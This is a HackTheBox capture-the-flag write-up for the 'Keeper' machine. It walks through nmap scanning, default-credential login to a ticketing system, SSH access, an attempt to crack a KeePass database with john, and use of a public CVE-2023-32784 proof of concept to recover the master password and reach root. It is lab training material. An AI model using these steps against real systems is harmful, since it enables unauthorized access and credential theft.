
---
title: Keeper HTB (English)
image: /assets/img/Anexos/Máquina%20Keeper-17.png
description: Granny HackTheBox Machine [Difuculty easy]
categories: [CTF,HackTheBox]
tags: [hacking,easy]
---



## Introduction

 Keeper is an easy-difficulty Linux machine that features a support ticketing system that uses default credentials. Enumerating the service, we are able to see clear text credentials that lead to SSH access. With `SSH` access, we can gain access to a KeePass database dump file, which we can leverage to retrieve the master password. With access to the `Keepass` database, we can access the root `SSH` keys, which are used to gain a privileged shell on the host. 
### Machine Description

![](/assets/img/Anexos/Máquina%20Keeper-20.png)

- Name: Keeper
- Goal: Get two flags
- Difficulty: easy
- Operating System: Linux
- link: [Keeper](https://app.hackthebox.com/machines/556)


### PDF Link
- PDF: [PDF Link](https://github.com/juanbelin/Writeups-CTFs-Challenges/blob/main/HTB/M%C3%A1quina%20Keeper.pdf)



## Reconnaissance 


Keeper is an easy-difficulty Linux machine that features a support ticketing system that uses default credentials. Enumerating the service, we are able to see clear text credentials that lead to SSH access. With `SSH` access, we can gain access to a KeePass database dump file, which we can leverage to retrieve the master password. With access to the `Keepass` database, we can access the root `SSH` keys, which are used to gain a privileged shell on the host.



We staring as always using `nmap` in order to know ports and services running in the victim machine.
```shell
nmap -sSCV -p- --open --min-rate=5000 -Pn -n 10.10.11.227 -oN scan1.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-12 18:45 CEST
Stats: 0:00:11 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 69.95% done; ETC: 18:46 (0:00:05 remaining)
Nmap scan report for 10.10.11.227
Host is up (0.34s latency).
Not shown: 63760 closed tcp ports (reset), 1773 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:39:d4:39:40:4b:1f:61:86:dd:7c:37:bb:4b:98:9e (ECDSA)
|_  256 1a:e9:72:be:8b:b1:05:d5:ef:fe:dd:80:d8:ef:c0:66 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.94 seconds
```

Nmap reports us the port _22_, and _80_:

In the web we can see two domains so I add those to the _/etc/hosts_

![](/assets/img/Anexos/Máquina%20Keeper.png)

![](/assets/img/Anexos/Máquina%20Keeper-1.png)

 In the _keeper.htb_ domain we can see that there is a login which is using RT:
![](/assets/img/Anexos/Máquina%20Keeper-3.png)
Searching we get the default credentilas and once we trying we successfully login.

![](/assets/img/Anexos/Máquina%20Keeper-4.png)

Once in, I see the next user:

![](/assets/img/Anexos/Máquina%20Keeper-5.png)
## Explotation

On settings dashboard there is a comment with a password:

![](/assets/img/Anexos/Máquina%20Keeper-6.png)


So now we can try using the user and the found password to login via `ssh` and we're in:

```shell
lnorgaard@keeper:~$ ls
RT30000.zip  user.txt
lnorgaard@keeper:~$ ls -la
total 85384
drwxr-xr-x 4 lnorgaard lnorgaard     4096 Jul 25  2023 .
drwxr-xr-x 3 root      root          4096 May 24  2023 ..
lrwxrwxrwx 1 root      root             9 May 24  2023 .bash_history -> /dev/null
-rw-r--r-- 1 lnorgaard lnorgaard      220 May 23  2023 .bash_logout
-rw-r--r-- 1 lnorgaard lnorgaard     3771 May 23  2023 .bashrc
drwx------ 2 lnorgaard lnorgaard     4096 May 24  2023 .cache
-rw------- 1 lnorgaard lnorgaard      807 May 23  2023 .profile
-rw-r--r-- 1 root      root      87391651 Apr 12 19:12 RT30000.zip
drwx------ 2 lnorgaard lnorgaard     4096 Jul 24  2023 .ssh
-rw-r----- 1 root      lnorgaard       33 Apr 12 18:42 user.txt
-rw-r--r-- 1 root      root            39 Jul 20  2023 .vimrc
lnorgaard@keeper:~$ unzip RT30000.zip
Archive:  RT30000.zip
  inflating: KeePassDumpFull.dmp     
 extracting: passcodes.kdbx     
```


A keepass database exists so lets first move it to our machine using `nc`:
![](/assets/img/Anexos/Máquina%20Keeper-9.png)

![](/assets/img/Anexos/Máquina%20Keeper-8.png)

We need the password key to unlock it, we can try using `john`:
```shell
❯ keepass2john passcodes.kdbx > hash
```

```shell
john hash -w=/usr/share/wordlists/rockyou.txt
Warning: detected hash type "KeePass", but the string is also recognized as "KeePass-opencl"
Use the "--format=KeePass-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [AES/Argon2 128/128 SSE2])
Cost 1 (t (rounds)) is 60000 for all loaded hashes
Cost 2 (m) is 0 for all loaded hashes
Cost 3 (p) is 0 for all loaded hashes
Cost 4 (KDF [0=Argon2d 2=Argon2id 3=AES]) is 3 for all loaded hashes
Will run 12 OpenMP threads
Note: Passwords longer than 41 [worst case UTF-8] to 124 [ASCII] rejected
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
0g 0:00:00:44 3.07% (ETA: 20:33:03) 0g/s 11611p/s 11611c/s 11611C/s gadsden..gabytkm
```

But this is just a rabbit hole. We can try to exploit using the  CVE-2023-32784:


- https://github.com/dawnl3ss/CVE-2023-32784

## Privilage Escalation

```shell
❯ sudo python3 poc.py KeePassDumpFull.dmp
2025-04-12 20:20:09,723 [.] [main] Opened KeePassDumpFull.dmp
Possible password: ●,dgr●d med fl●de
Possible password: ●ldgr●d med fl●de
Possible password: ●`dgr●d med fl●de
Possible password: ●-dgr●d med fl●de
Possible password: ●'dgr●d med fl●de
Possible password: ●]dgr●d med fl●de
Possible password: ●Adgr●d med fl●de
Possible password: ●Idgr●d med fl●de
Possible password: ●:dgr●d med fl●de
Possible password: ●=dgr●d med fl●de
Possible password: ●_dgr●d med fl●de
Possible password: ●cdgr●d med fl●de
Possible password: ●Mdgr●d med fl●de
```
I've got this possible passwords. Looking on Google I found what seem the full password:


![](/assets/img/Anexos/Máquina%20Keeper-11.png)
Once in we see the root putty key file, so lets use it in order to log in as root using `putty`:

![](/assets/img/Anexos/Máquina%20Keeper-12.png)

![](/assets/img/Anexos/Máquina%20Keeper-13.png)


![](/assets/img/Anexos/Máquina%20Keeper-14.png)

![](/assets/img/Anexos/Máquina%20Keeper-15.png)

![](/assets/img/Anexos/Máquina%20Keeper-16.png)

And we're root.